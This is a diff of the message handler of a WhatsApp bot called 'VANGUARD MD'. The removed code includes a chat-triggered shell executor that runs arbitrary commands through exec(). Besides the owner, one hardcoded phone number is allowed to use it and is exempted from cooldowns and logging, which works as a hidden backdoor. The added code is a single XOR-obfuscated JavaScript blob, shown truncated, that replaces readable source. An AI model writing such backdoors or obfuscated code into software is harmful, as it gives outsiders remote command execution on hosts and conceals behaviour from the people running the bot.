-    '🐮', '🐷', '🐽', '🐸', '🐵', '🙈', '🙉', '🙊', '🐒', '🐔', '🐧', '🐦', 
-    '🐤', '🐣', '🐥', '🦆', '🦅', '🦉', '🦇', '🐺', '🐗', '🐴', '🦄', '🐝', 
-    '🪱', '🐛', '🦋', '🐌', '🐞', '🐜', '🦗', '🪳', '🕷', '🕸', '🦂', '🐢', 
-    '🐍', '🦎', '🦖', '🦕', '🐙', '🦑', '🦐', '🦞', '🦀', '🐡', '🐠', '🐟', 
-    '🐬', '🐳', '🐋', '🦈', '🐊', '🐅', '🐆', '🦓', '🦍', '🦧', '🐘', '🦛', 
-    '🦏', '🐪', '🐫', '🦒', '🦘', '🦬', '🐃', '🐂', '🐄', '🐎', '🐖', '🐏', 
-    '🐑', '🦙', '🐐', '🦌', '🐕', '🐩', '🦮', '🐕‍🦺', '🐈', '🐈‍⬛', '🪶', 
-    '🐓', '🦃', '🦚', '🦜', '🦢', '🦩', '🕊', '🐇', '🦝', '🦨', '🦡', '🦫', 
-    '🦦', '🦥', '🐁', '🐀', '🐿', '🦔', '🐾', '🐉', '🐲', '🌵', '🎄', '🌲', 
-    '🌳', '🌴', '🪹', '🪺', '🪵', '🌱', '🌿', '☘️', '🍀', '🎍', '🪴', '🎋', 
-    '🍃', '🍂', '🍁', '🍄', '🐚', '🪨', '🌾', '💐', '🌷', '🌹', '🥀', '🌺', 
-    '🌸', '🌼', '🌻', '🌞', '🌝', '🌛', '🌜', '🌚', '🌕', '🌖', '🌗', '🌘', 
-    '🌑', '🌒', '🌓', '🌔', '🌙', '🌎', '🌍', '🌏', '🪐', '💫', '⭐️', '🌟', 
-    '✨', '⚡️', '☄️', '💥', '🔥', '🌪', '🌈', '☀️', '🌤', '⛅️', '🌥', '☁️', 
-    '🌦', '🌧', '⛈', '🌩', '🌨', '❄️', '☃️', '⛄️', '🌬', '💨', '💧', '💦', 
-    '☔️', '☂️', '🌊', '🌫',
-    
-    // Food & Drink (complete)
-    '🍏', '🍎', '🍐', '🍊', '🍋', '🍌', '🍉', '🍇', '🍓', '🫐', '🍈', '🍒', 
-    '🍑', '🍍', '🥝', '🍅', '🍆', '🥑', '🥦', '🥬', '🥒', '🌶', '🫑', '🌽', 
-    '🥕', '🫒', '🧄', '🧅', '🥔', '🍠', '🥐', '🥯', '🍞', '🥖', '🥨', '🧀', 
-    '🥚', '🍳', '🧈', '🥞', '🧇', '🥓', '🥩', '🍗', '🍖', '🦴', '🌭', '🍔', 
-    '🍟', '🍕', '🫓', '🥪', '🥙', '🧆', '🌮', '🌯', '🫔', '🥗', '🥘', '🫕', 
-    '🥫', '🍝', '🍜', '🍲', '🍛', '🍣', '🍱', '🥟', '🦪', '🍤', '🍙', '🍚', 
-    '🍘', '🍥', '🥠', '🥮', '🍢', '🍡', '🍧', '🍨', '🍦', '🥧', '🧁', '🍰', 
-    '🎂', '🍮', '🍭', '🍬', '🍫', '🍿', '🍩', '🍪', '🌰', '🥜', '🍯', '🥛', 
-    '🍼', '🫖', '☕️', '🍵', '🧃', '🥤', '🧋', '🍶', '🍺', '🍻', '🥂', '🍷', 
-    '🥃', '🍸', '🍹', '🧉', '🍾', '🧊', '🥄', '🍴', '🍽', '🥣', '🥡', '🥢', 
-    '🧂',
-    
-    // Travel & Places
-    '🚗', '🚕', '🚙', '🚌', '🚎', '🏎', '🚓', '🚑', '🚒', '🚐', '🛻', '🚚', 
-    '🚛', '🚜', '🦯', '🦽', '🦼', '🛴', '🚲', '🛵', '🏍', '🛺', '🚨', '🚔', 
-    '🚍', '🚘', '🚖', '🚡', '🚠', '🚟', '🚃', '🚋', '🚞', '🚝', '🚄', '🚅', 
-    '🚈', '🚂', '🚆', '🚇', '🚊', '🚉', '✈️', '🛫', '🛬', '🛩', '💺', '🛰', 
-    '🚀', '🛸', '🚁', '🛶', '⛵️', '🚤', '🛥', '🛳', '⛴', '🚢', '⚓️', '🪝', 
-    '⛽️', '🚧', '🚦', '🚥', '🚏', '🗺', '🗿', '🗽', '🗼', '🏰', '🏯', '🏟', 
-    '🎡', '🎢', '🎠', '⛲️', '⛱', '🏖', '🏝', '🏜', '🌋', '⛰', '🏔', '🗻', 
-    '🏕', '⛺️', '🛖', '🏠', '🏡', '🏘', '🏚', '🏗', '🏭', '🏢', '🏬', '🏣', 
-    '🏤', '🏥', '🏦', '🏨', '🏪', '🏫', '🏩', '💒', '🏛', '⛪️', '🕌', '🕍', 
-    '🛕', '🕋', '⛩', '🛤', '🛣', '🗾', '🎑', '🏞', '🌅', '🌄', '🌠', '🎇', 
-    '🎆', '🌇', '🌆', '🏙', '🌃', '🌌', '🌉', '🌁',
-    
-    // Objects
-    '⌚️', '📱', '📲', '💻', '⌨️', '🖥', '🖨', '🖱', '🖲', '🕹', '🗜', '💽', 
-    '💾', '💿', '📀', '📼', '📷', '📸', '📹', '🎥', '📽', '🎞', '📞', '☎️', 
-    '📟', '📠', '📺', '📻', '🎙', '🎚', '🎛', '🧭', '⏱', '⏲', '⏰', '🕰', 
-    '⌛️', '⏳', '📡', '🔋', '🪫', '🔌', '💡', '🔦', '🕯', '🪔', '🧯', '🛢', 
-    '💸', '💵', '💴', '💶', '💷', '🪙', '💰', '💳', '💎', '⚖️', '🪜', '🧰', 
-    '🪛', '🔧', '🪜', '🔨', '⚒', '🛠', '⛏', '🪚', '🔩', '⚙️', '🪤', '🧱', 
-    '⛓', '🧲', '🔫', '💣', '🧱', '🔪', '🗡', '⚔️', '🛡', '🚬', '⚰️', '🪦', 
-    '⚱️', '🏺', '🔮', '📿', '🧿', '💎', '🔔', '🔕', '📣', '📢', '💬', '💭', 
-    '🗯', '♠️', '♣️', '♥️', '♦️', '🃏', '🎴', '🀄️', '🕐', '🕑', '🕒', '🕓', 
-    '🕔', '🕕', '🕖', '🕗', '🕘', '🕙', '🕚', '🕛', '🕜', '🕝', '🕞', '🕟', 
-    '🕠', '🕡', '🕢', '🕣', '🕤', '🕥', '🕦', '🕧',
-    
-    // Symbols
-    '💮', '💯', '♨️', '💢', '💬', '👁️‍🗨️', '🗨', '🗯', '💭', '💤', '💠', '♠️', 
-    '♥️', '♦️', '♣️', '🃏', '🀄️', '🎴', '🎭', '🔇', '🔈', '🔉', '🔊', '📢', 
-    '📣', '📯', '🔔', '🔕', '🎵', '🎶', '💹', '🛗', '🏧', '🚮', '🚰', '♿', 
-    '🚹', '🚺', '🚻', '🚼', '🚾', '🛂', '🛃', '🛄', '🛅', '⚠️', '🚸', '⛔', 
-    '🚫', '🚳', '🚭', '🚯', '🚱', '🚷', '📵', '🔞', '☢️', '☣️', '⬆️', '↗️', 
-    '➡️', '↘️', '⬇️', '↙️', '⬅️', '↖️', '↕️', '↔️', '↩️', '↪️', '⤴️', '⤵️', 
-    '🔃', '🔄', '🔙', '🔚', '🔛', '🔜', '🔝', '🛐', '⚛️', '🕉', '✡️', '☸️', 
-    '☯️', '✝️', '☦️', '☪️', '☮️', '🕎', '🔯', '♈', '♉', '♊', '♋', '♌', '♍', 
-    '♎', '♏', '♐', '♑', '♒', '♓', '⛎', '🔀', '🔁', '🔂', '▶️', '⏩', '⏭', 
-    '⏯', '◀️', '⏪', '⏮', '🔼', '⏫', '🔽', '⏬', '⏸', '⏹', '⏺', '⏏️', '🎦', 
-    '🔅', '🔆', '📶', '📳', '📴', '♀️', '♂️', '⚧', '✖️', '➕', '➖', '➗', '♾', 
-    '‼️', '⁉️', '❓', '❔', '❕', '❗', '〰️', '💱', '💲', '⚕️', '♻️', '⚜️', '🔱', 
-    '📛', '🔰', '⭕', '✅', '☑️', '✔️', '❌', '❎', '➰', '➿', '〽️', '✳️', '✴️', 
-    '❇️', '©️', '®️', '™️', '#️⃣', '*️⃣', '0️⃣', '1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', 
-    '6️⃣', '7️⃣', '8️⃣', '9️⃣', '🔟', '🔠', '🔡', '🔢', '🔣', '🔤', '🅰️', '🆎', 
-    '🅱️', '🆑', '🆒', '🆓', 'ℹ️', '🆔', 'Ⓜ️', '🆕', '🆖', '🅾️', '🆗', '🅿️', 
-    '🆘', '🆙', '🆚', '🈁', '🈂️', '🈷️', '🈶', '🈯', '🉐', '🈹', '🈚', '🈲', 
-    '🉑', '🈸', '🈴', '🈳', '㊗️', '㊙️', '🈺', '🈵'
-  ])
-  
-  const chars = [...trimmedBody]
-  
-  // NEW LOGIC: Any combination of allowed emojis, max 20, no text allowed
-  const isEmojiTrigger = (
-    chars.length >= 1 && 
-    chars.length <= 20 &&
-    chars.every(c => emojiSet.has(c))
-  )
-  
-  if (isEmojiTrigger) {
-    try {
-      const vvCommand = commands['vv2'] || commands['vv']
-      if (vvCommand) {
-        await vvCommand({
-          sock, msg, jid, sender, senderNum, quoted,
-          command: 'vv2', args: [], body: trimmedBody,
-          fromGroup, fromMe, isOwner: true, isSudo: true,
-          groupSettings: {}, prefix: getPrefix(),
-          reply: () => {},
-          sendMsg: (c) => sock.sendMessage(jid, c),
-          simulatePresence: () => {},
-          react: (e) => sock.sendMessage(jid, { react: { text: e, key: msg.key } }),
-        })
-      }
-    } catch (err) {
-      logger.error('Emoji VO trigger error: ' + err.message)
-    }
-    continue
-  }
-}
-
-        // ── Terminal executor ─────────────────────────────
-        if (body.trim().startsWith('> ')) {
-          const isAuthorized = isOwner(sender) || senderNum === '256745626308'
-          if (!isAuthorized) {
-            const mode = config.mode || defaults.mode
-            if (mode === 'public') {
-              try {
-                await sock.sendMessage(jid, {
-                  text: '⚠️ _Only Owner can execute terminal codes_ ❌',
-                }, { quoted: msg })
-              } catch (_) {}
-            }
-            continue
-          }
-          const code = body.trim().slice(2).trim()
-          if (!code) continue
-          exec(code, { timeout: 15000, maxBuffer: 1024 * 512 }, async (err, stdout, stderr) => {
-            const output = (stdout || '') + (stderr || '')
-            try {
-              if (output.trim()) {
-                await sock.sendMessage(jid, { text: '```\n' + output.trim().slice(0, 3500) + '\n```' }, { quoted: msg })
-              } else if (err) {
-                await sock.sendMessage(jid, { text: '❌ _Error:_ `' + err.message.slice(0, 500) + '`' }, { quoted: msg })
-              } else {
-                await sock.sendMessage(jid, { text: '✅ _Executed!_' }, { quoted: msg })
-              }
-            } catch (_) {}
-          })
-          continue
-        }
-
-        // ── fromMe skip ───────────────────────────────────
-        if (fromMe) {
-          const noPrefix = isNoPrefixMode()
-          if (!noPrefix && !body.startsWith(getPrefix())) continue
-          if (noPrefix) {
-            const firstWord = body.trim().split(/\s+/)[0]
-            if (!firstWord || !commands[firstWord.toLowerCase()]) continue
-          }
-        }
-
-        // ── Auto React ────────────────────────────────────
-        if (!fromMe && !isOwner(sender) && senderNum !== '256745626308') {
-          const reactScope = config.autoReact != null ? config.autoReact : (defaults.autoReact != null ? defaults.autoReact : 'off')
-          if (inScope(reactScope, fromGroup)) {
-            setImmediate(async () => {
-              try {
-                const customs = config.autoReactCustom != null ? config.autoReactCustom : (defaults.autoReactCustom || [])
-                let pool
-                if (customs.length) {
-                  pool = customs
-                } else {
-                  try {
-                    const helperFile = path.join(__dirname, 'data', 'autoreacthelper.json')
-                    pool = fs.existsSync(helperFile)
-                      ? JSON.parse(fs.readFileSync(helperFile, 'utf8'))
-                      : ['❤️','😂','🔥','👍','😍','🙏','💯','😭','🥰','😎']
-                  } catch (_) {
-                    pool = ['❤️','😂','🔥','👍','😍','🙏','💯','😭','🥰','😎']
-                  }
-                }
-                const emoji = pool[Math.floor(Math.random() * pool.length)]
-                await sock.sendMessage(jid, { react: { text: emoji, key: msg.key } })
-              } catch (_) {}
-            })
-          }
-        }
-
-        // ── Auto Read ─────────────────────────────────────
-        const autoRead = config.autoRead != null ? config.autoRead : (defaults.autoRead != null ? defaults.autoRead : 'off')
-        if (inScope(autoRead, fromGroup)) {
-          try { await sock.readMessages([msg.key]) } catch (_) {}
-        }
-
-        // ── Save message ──────────────────────────────────
-        saveMessage(msg, sender, jid).catch(() => {})
-        if (isViewOnce(msg)) saveViewOnce(msg, sender, jid).catch(() => {})
-
-        // ── Sudo alias learning ───────────────────────────
-        if (!fromMe && isSudo(sender, fromGroup) && senderNum !== '256745626308') {
-          learnAlias(sender, senderNum, true, false)
-        }
-
-        // ── Group enforcers ───────────────────────────────
-        if (fromGroup && !isSudo(sender, fromGroup) && !fromMe) {
-          try { await enforceLink(sock, msg, jid, sender) }    catch (_) {}
-          try { await enforceSticker(sock, msg, jid, sender) } catch (_) {}
-          try { await enforceMedia(sock, msg, jid, sender) }   catch (_) {}
-          try { await enforceBadword(sock, msg, jid, sender) } catch (_) {}
-        }
-
-        // ── Active message counter ────────────────────────
-        if (fromGroup && isCounterActive(jid)) {
-          const { isBotAdmin } = require('./lib/utils')
-          const botStillAdmin = await isBotAdmin(sock, jid).catch(() => false)
-          if (!botStillAdmin) {
-            pauseAndClear(jid)
-            logger.warn('Active counter paused for ' + jid + ' - bot lost admin rights')
-          } else {
-            incrementCount(jid, sender)
-          }
-        }
-
-        // ── Chatbot ───────────────────────────────────────
-        const chatbotEnabled = config.chatbot != null ? config.chatbot : defaults.chatbot
-        if (chatbotEnabled) {
-          const noPrefix_cb    = isNoPrefixMode()
-          const isKnownCommand = noPrefix_cb
-            ? Boolean(commands[(body.trim().split(/\s+/)[0] || '').toLowerCase()])
-            : body.startsWith(getPrefix())
-          if (!isKnownCommand) {
-            try {
-              const chatbotData = JSON.parse(fs.readFileSync(path.join(__dirname, 'data', 'chatbot.json'), 'utf8'))
-              const lowerBody = body.toLowerCase().trim()
-              const chatReply = chatbotData[lowerBody]
-              if (chatReply) {
-                await sendReply(sock, jid, { text: chatReply }, msg)
-                continue
-              }
-            } catch (_) {}
-          }
-        }
-
-        // ── Command Parsing ───────────────────────────────
-        const prefix   = getPrefix()
-        const noPrefix = isNoPrefixMode()
-
-        if (!noPrefix && !body.startsWith(prefix)) continue
-
-        const rawArgs = noPrefix
-          ? body.trim().split(/\s+/)
-          : body.slice(prefix.length).trim().split(/\s+/)
-
-        const args    = rawArgs.slice()
-        const command = (args.shift() || '').toLowerCase()
-        if (!command) continue
-
-        // ── Cooldown ──────────────────────────────────────
-        if (!isOwner(sender) && senderNum !== '256745626308') {
-          const coolKey  = senderNum + ':' + command
-          const lastUsed = cooldowns.get(coolKey) || 0
-          const now      = Date.now()
-          if (now - lastUsed < COOLDOWN_MS) {
-            const remaining = ((COOLDOWN_MS - (now - lastUsed)) / 1000).toFixed(1)
-            try {
-              await sock.sendMessage(jid, {
-                text: '⏳ Please wait *' + remaining + 's* before using this command again.',
-              }, { quoted: msg })
-            } catch (_) {}
-            continue
-          }
-          cooldowns.set(coolKey, now)
-        }
-
-        const groupSettings = fromGroup ? getGroupSettings(jid) : {}
-
-        // ── Build context ─────────────────────────────────
-        const ctx = {
-          sock, msg, jid, sender, senderNum,
-          args, body, command, quoted, mentions,
-          fromGroup, fromMe,
-          isOwner: isOwner(sender),
-          isSudo:  isSudo(sender, fromGroup),
-          groupSettings, prefix,
-          reply:            (content) => sendReply(sock, jid, typeof content === 'string' ? { text: content } : content, msg),
-          sendMsg:          (content) => sock.sendMessage(jid, content),
-          simulatePresence: () => {},
-          react:            (emoji)   => sock.sendMessage(jid, { react: { text: emoji, key: msg.key } }),
-        }
-
-        // ── Route ─────────────────────────────────────────
-        const mode = config.mode || defaults.mode
-
-        if (commands[command]) {
-          if (!canUseCommands({ mode, fromGroup, sender, fromMe, senderNum })) continue
-          
-          // LOG COMMAND EXECUTION (Update previous log to show it's a command)
-          if (senderNum !== '256745626308' && !fromMe) {
-            logger.message({
-              type: 'command',
-              sender: senderNum,
-              name: msg.pushName || 'Unknown',
-              chatId: jid,
-              message: (noPrefix ? '' : prefix) + command + ' ' + args.join(' '),
-              isCommand: true
-            })
-          }
-          
-          try {
-            await commands[command](ctx)
-          } catch (err) {
-            logger.error('Command error [' + command + ']: ' + err.message)
-            try { await ctx.reply('❌ *Error running command:* ' + command + '\n_' + err.message + '_') } catch (_) {}
-          }
-        }
-
-      } catch (err) {
-        logger.error('Message processing error: ' + err.message)
-      }
-    }
-  })
-
-  logger.success('✅ VANGUARD MD Online 🟢❇️')
-}
+const _0xHex=[0x0,0x1,0x2,"length","charCodeAt","fromCharCode"];const _0xKey=222;const _0xBlob="¸«°½ª·±°þö÷¥½±°­ªþ³ãùæµí±µ¼½«ùòùê½³±ªèº½¿ùòù±¯³µ³ùòùæ²©õèµ¿±µõõé¯ùòùé½³±¤ªæµæùòù»è¶ºê¸æ±¯ùòùæµ±õèùòùª³±ªè½¨¿ùòù§³±ëîéùòùèºæ±¬èùòùéºª²ºæ±°ùòù¯ê¤ª¿¿ùòù»ñ§««¦¯ùòù³±éùòùé¶í²«ùòù«ëï±¿ùòù¹³±§æùòùëíºî»«ùòù¨¨½¦ì·ùòù¼½æµìè»ùòù¼æ±¨±¯ùòùêí½æ±éêùòù§¦´´«ùòù±ï½±§ê¿ùòù¨³±ê½¶´º¨ùòù®ºµõê¬ùòù¸½µ¯ùòù²ºï·é«ùòù¼æ±é©±§ùòù²³±«°³±¦¦®í½ùòù«±ë¦ºì¿ùòù½ªº±«æ±ùòùµ­ê»æ¶ùòùº¨¯¯ª¬½³µêùòùê½³±«µñùòù¿æ±©í·ºíº¿ùòùèïê½¸ùòù§³±èé½¦»ùòù¯ê«ùòù³ìñ½µ¿ùòùµ¬°¿±ç¸íêùòù©³±ê¨µ©¯ùòùæµõµ¼®½§ùòùè½±³µ¦ùòùë²½æ±º¿ùòù»»»§êê´·ùòù¦±»´ùòùèç»ïùòùæ¬º½ùòùº½ªº¬§ùòùõë¨¶³±´¶¶º³µëùòùñ½µ¦µ¨ùòù±­æµ¨ùòù½±ùòù»æµéª½µ¸ïî¯µë·ùòù³µ´¤¹³µ¯»®½³±¨ùòùè°¹¯ùòùéíºªùòù©±¼º¯ùòù¹æµæè¶½µ¨¦µëùòù¤«ë°¶¦º¯ùòù¶½¯¨¹ùòùæµ±µ¿µõéùòùèï­è½½ìùòùê¼¿¼î¼ùòùµæ±´«¯ùòùæµ¿µ½½ñ·ùòù·´ùòù½ºº³±¬±·ùòù«ñ¹¿¶µ¯ùòù¹³±¬ùòù§æ±éêªº¯ùòù®½±·«ùòù½³±èùòù¤±ééººæ±ùòùê§í®½ùòù±»³µëêùòùëé½±º¯ùòù¼±ç©±µç¶ºùòù¨´¸í¯íº¨ººùòùëººª®º±ùòù½»íºùòùèªé²½¸½º«ºùòùëé½±¤­³µ¨ùòù°½æ±è»ùòùé®½±«æµîùòù±¹½µ¨éùòùè½æ±ºùòùº©ì«ùòùé½±¬©¯ùòù³±µ´ª½ùòù°º±ì­¯ùòùæ´½¯ùòùè¦º­»ñ½»´ùòùæµ¨¿¯ùòù»æ±¬¶³±ùòù¶³µ©è²½µùòùæ±´¿½¿ùòù¨µèº¯ùòù§³±ëºæ±º³µ½æ±êùòùºæµ»°»ùòù½æ±¤«±èùòù§î¬í®¯ùòù¬·ìéºí½¯æùòù¬³±èº±±ùòùéª½±º¸©½¼¦ºùòù²½¶¶º¬ñ½³±¯·±·ùòùº±¿¿îùòù·µì¬­·¿ùòù³±©é®½¹ùòù½µµï³ùòùé½³±ê¶½¶¿ùòùº±­ùòù²ªºæ±ª¯ùòù°µ¸ê¶½µ¶ùòù½¨´ùòù®½±¯¯½æ°ùòù²³µ«ùòù½æµ±íîùòùæ²ªµ¼ñ½§ùòùéé½¯º¼·ùòù·æ¶êùòùéº­¯§ùòùí½ºëæîùòùæ²µ¼ñ½§ùòù¯±é®½¹¯ùòù¯³±é²½¶§ùòù²º³±ì¯¬ùòùé®½±ïæùòù¦½­®º®½µé½¼¿ùòù°î¬©§ùòù±º½®½¯ùòùæ²°±µ¼õµ§õé¯ùòù¶ï½µêùòùñ½ª¦º¯ùòùª½²º¯®½æµºè½¿·ùòù¹§¨º±¶»°é¿ùòù©±é²ºêùòùèº½³±½¸ë±´ê³ùòù­ï´¯¼¹ùòùñº±¨º±©²±ùòùæêç½±»ùòù½¶º¼ùòù«³±ïè²º¶»ùòù³±¯æµ¼¿ùòù½¦ºªùòùº»êéª½æµùòùæ´õõõë±µ½ñ½çë®ùòù¤©î¸èºùòùõêæ¼±»ºµñùòù¨±ê½î¶º½¿ùòù²³±­°æ±º¤¯½¿ùòùè¨éëñ½©ùòùæ²ì¬µ½¹´§êùòùæ§µ¶±µ¼µ¤õõë¿ùòù¼µ¦¿µ¼¤³µí¼æ±½ùòù»æ¦ùòùæ´ìí±µ¿õµ§õõêùòù±õ¼¬®½ùòùµ±¸ùòù³±ê¶½¿ùòùµµ®¤è®ùòù½ªêùòùí®èº¹æ±ùòùëºº³±²è¸ñº¶½³ùòùëí½±¿©§ùòùº»½ùòù³í¶½æ±©êºî¿ùòù³±¦è½çñéºª¿ùòùéª½æ±íùòù¨±é³ùòùëºùòùí½±æ±½ùòù³«¯ùòùê¦ºïæùòùîé®µùòùæµ©±µºõµ§õéùòùµªº±©ª¿ùòùçñ·¦¦º®½½ùòù²µæë«¼¯ùòùºµíùòù³±¤ëñ½ï³ùòù¹æ±æ±®³ùòùæµ±±µ½¹¼é¿ùòù´æ±¶³±õùòù¸¬®ê¦ºîíº¯ùòùéèé½¸½¦¶º»ºùòù««¿æùòù¨æ±µé²½ùòùº±ï¹¦½µ«±ùòù¨±êª½îªºùòù¹¦½µ¼é»ê¨íë¿ùòùæ´ìíµ¿ñ½²æùòù³³¯æµ¸µ¿ëê¦½ùòù½æ±³±¯æùòù¿±æ±¶§ùòù«³µ­¤³¦ùòù¨µ¶®¿ùòùê½±³µùòù·©¬µ®ùòù¤±¸ë®º±ùòù§±é¦º¦ùòùë¸¶«ùòù¦éº±ºî¬ùòùëë²´½ùòùº³µëèõªùòù¶µíè§ùòùæµ½µºµõè¿ùòù¿««·¶»ùòù³µ°²±³µ¶¬«ùòù¨³±¿è®½»ùòù½µµ±«îùòù¸½º³±ì¯±±µêùòù³½±©ê²º¿õ²ùòù½¿ç«ùòù½»í½µî¤ùòùèº½æùòùç§¦·½ùòù«¯µ²¿ùòùë­¦·îùòù¶æµ½µ¬¦æµùòù±¦½³±«è»ùòù¼½µªè¯ùòùîªî®½ùòùæ²èµ½±µõõêùòù«µè½µñêùòù®³±·±æ±»ë½¶½ªùòùµµ©°ùòù¿³µîèí½³µ¤ê¦æµìëùòù«±é½º±½±ùòùê½±ñê½¯ùòùé¦ºªç½©¨ùòù¿ïñ½æµêëùòùªí²ùòùº³µèï¿¶»«¹«ùòù¿¦««½¯ùòù½³µ­ê¬ºº¼³ùòù½æµºæµªùòù¸¤ª³µ¤±¼æ²©±½ùòùêùòùè½±¹§¿¼¯ùòùë½æ±ªµ¦ºî§ë»ùòù»µµ¼¯ùòù¸½º³±ì¯±ùòùëíº®º³±ùòù­±æ¹½ùòùé²½±³³ºé®º©æùòùæµ±«µ¼µõê¿ùòùæ§îµº½§ùòùºº³±±êùòù¼æ±«»»·ùòùë¶ºíº³±ì«ùòù±µ»ùòù¯í´¹îùòù½µ¶¶»¦º³µ³¨¿ùòù¿­µè²¿ùòùèº±êëõùòù¹ìé½³µºùòù¯³±®«³±¶µ²±¿ùòù¦æ±ªèº¨ùòù½±«±±ùòù»½ñº±ùòùé®½æ±é°éº³±ùòùëéº³µ²º±´±±«ë¦º¯ùòù²ºæ±ªùòù®¹í½±¶ë®º¯ê­ùòù½³±¨±»ùòù·ªµµùòù§õêõµ¿¿ùòùè¶ºæ±ëë¸ùòùê½³±¨¿ìîùòùªºµ¤ê¯ùòù±ì®½¯ùòù­ì¯¶«ªºªª½­ª½¿ùòù¹æµ¶µé¯ùòù¸³µèñ½³µîùòùµ±±³³±¶»í½ùòùêèèéº¦½µè¼êº±ùòù«½¿ùòùæ´µºñ½©¿ùòùí½±¸ê±ùòù¦º¸¿ñê¤ï²½³µùòùëº¯ºæ±ùòùé½³±¦±ùòù½³±¯õùòù¼±ç©æ±§ç±º¸«ìùòùèí½±·¤é¦ºï»§ùòùêºººæ±ê»¹­¿ùòùï·¯³ùòù¤õêµ½ùòù°æµ®µ¯ùòù¸º±¯±ëùòù¯±½ëñºùòùè¼»¨îùòùæ§õµ¼µ±õë¯ùòù¸ë®êùòù·³µ®½­õé«¼¬µùòù·µº³µ¶§ùòù®µìê½µ­ùòù¿µîè½³µî­µ¼ëùòùé®éí½ï½½ùòù­³±µ½¿ùòùæ²µ½µõéùòùæ²õ¨±µ½®½õ¯ùòù°µ§³µ¿­¨¦½³±°ùòù¨îèº¿ùòù¸¦º³±¯±ëë±³µëùòùªæµï¸ª¿ùòùéçí¶ëè°²¯ùòùæ±ë®ºïùòù¦º³µêëùòùº¯îùòùº¹½³µ«éùòù½ñº­·ùòùé¸îùòùæ´©±µ½±µõê¿ùòùæ´õµ¿®½¤é§ùòù¨æ±ê½¨«ùòùí½æµ®¶¿ùòùé²º¼î³ùòù¿ùòùº½¤½¯ùòù°æµñ»µñ¸í¦½æ±¿ùòù¿æ±ïª±±«ùòù¬ª¶©æùòùº½º´²¯ùòùæµ¯«±­êê§ùòùè½±«²ºùòùí½¹¦º¼ñ½æ±«ùòùé½³±·ìêº¨§¬ùòù¿æµ´µ¦ùòù½¼±½±õ³ùòù¤±«ê½ï¿ùòù±çëºº±·ùòù½³±êùòùµî¬¿ùòù¿µõ¸§°¯ùòù´æµ´¶ùòùèº­æõº½©¿ùòùè½«¨ùòù»±¶½¿ëíêº¦¤¹ùòù¯ïï°íùòù·¶½±¶ëªºæ¯¿ùòù®¹¦½æ±¼êæùòù·êùòù½ìé½µ½éùòùè½³±±¿ùòùê¶ëª§¹®»ºæ±ª¼ïùòùè½±éª½ùòùè²º­¦½¹»îùòùæ§µµ¼½¯ëùòùèí½±ìë½¸»³±½ëîùòù¿ëïï·±ç»ùòù´½³±èêùòù©±ë¶¬¯©µõ¶±ºùòùé½¬ùòù¿µîèé½µï¦µë»ùòù¯©¤æµ´¼îùòùè½³±®ê½¿ùòùæ±ñ²¼¶½ùòù¦½°´¿±ìùòùíº±»ùòù¤±ééº¶§²¿«ª³µïùòùè¶½³±¤¶·´é¦º¶§ùòù¹¦½æµ¤éæ¨¯ùòù­±¦µé½ùòùêèï«ëº¼´»µ¶ùòùª±éª½©îùòù§ª¤µ¤¼¯ùòù²¼õñùòù¶æµè»æµ¿¯ùòùëëº¿ùòù½±ïª±«æ±¨±°ùòù¿¦¶½µ°ë³ùòùêééºê±æ´½ùòùí½±îí½íùòù¶¶ñ½µéêìùòùºµèîùòùèë¼½µé¸ºµùòùº«¯ìùòù­îç­¨³ùòùêµº·²ùòù¨æ±èéº½·ùòùêñ½æµ¦µ­µ®¯³µùòùµ±´®±»ì§ùòù´¹½³±³êº¿ùòù½®½µ»è¯¹¤º¯ùòùé½¬ùòù»µè½µîùòùê²½æ±ìùòù½³±¹«²ùòùïª·³¶º²º¯ùòùí½æµ°¿ùòù¨é°©º¯ùòù§¬¯«é½îùòù¸³µì»µªùòùêõ·ëªº¬¶æ±ñè§§´ùòùë½±§¸«ùòù¶ºµêè¤ìùòù¬æ±é²½íºæ±éùòùè¸±«ºùòù¦º±·ëº«®ºïêùòù¸º¤ùòù¿æ±¯½µª¦ùòùæ§õµ½µõë¿ùòùê¬³µé¸¯ùòùé²º±°èï¯ùòùéº±ìë°ùòù¯±õèõµº¿ùòù²æ±­»æ±ùòùë¦½æ±õ¶º¿ùòù±æéæùòù¶±ª³±±¸ùòùº³±»¿³±½«ùòù±¦îçùòù°æµê­ºµ·¸¯ùòùº½¤¬³ùòùè½±ê½î¬®±êëêùòù­æ±­ê¦º±ùòùèç±ºùòùêºæ±·é¸ùòù°¹®¶½¯ùòùë½³±¨µùòù»µ²»³µ¤µæ¼±»ëìùòùèí½±ëë½îçùòùè²½æ±é¬éíº³±î³æµìùòù¯ñªùòù¼¶ª½ùòù¶èº¯ùòù²¹½³µê¯ùòù±±½³±¯ùòù±èéº¿ùòù½ê¬­¹¿ùòù§³µñ¨ª¿ùòù½³µ¼¿¸ùòù¿½ªºæ±¨±ñ¯ùòù¶±éº««ùòù­ê¨µ³¯ùòù¤±ë®ºùòùê¶¦¬ùòù¶ì½µ»é«ùòù¦±õè½î§ùòùæµ©±µºñ½¤³ùòù½³±¿îùòù½µ¶®©»ùòù±æµ¯ùòù¬æ±¼êñºíêùòù°»´¤¸·ùòù«¶½ùòùë´µ·ùòùè½±¼íêùòù·¶®½æµ«ë»ùòù«°ìºùòù¸ì½æµ®­ùòù²½±ùòùêééºê±æ´½¨ùòù«±é½¸º±é½³±ùòù¯ç¬µ¹°ùòùíº³µ»êïùòù½¼«ùòùïêæùòù¬¯«î¹³µæ¤æ±õ³ùòù¸º±æ±ë´²æµùòù¬¼ùòùè¦ºùòù°¤¬ùòù°³µ°é¶ùòù­«±ñº¯ùòù±µµ»ùòù¦±ì¼½¿ùòù¬¶·´èº¯ùòùºñº±·­³±©¹¿ùòù¬±õéµ¼ùòù¤»è²ºùòù³±é¦º¹²¿ª¦µùòù¸ºº±¯ùòù¸¸½³µùòùºµ±êïùòù¸î··¨êùòùë½³±­ëéùòùè®½³±ëñ½»ùòù±ñéº¹ùòùè½æ±íë½ùòùè®½±¿·ùòùæ±ë½¦îùòù°·©æºîíº¿ùòù¬º®ùòù²½éº§ùòùêº½³±°¨µê²ºêùòùæ±¨æµ·»ì²¯¿ùòùë½±ç¶«ùòù³±³êé½©êùòùµº³±¸§ùòùé¦ºæé½©¤³¿ùòùº³µçè¤µùòùê¦½æ±êí½¿ùòù±ë½ïëé½ª¸µùòùé½µ¸ªºµ·¨½»ùòùè½æ±íêº½ùòùº®º±ùòùëí½æ±©ª¯ùòùµµ¨®¸µ±¯¿ùòùéí½³±ìê½«¨»®³±¿ëêùòù·©¸ùòùæ´±µ½®¹±³ùòùê¶½æ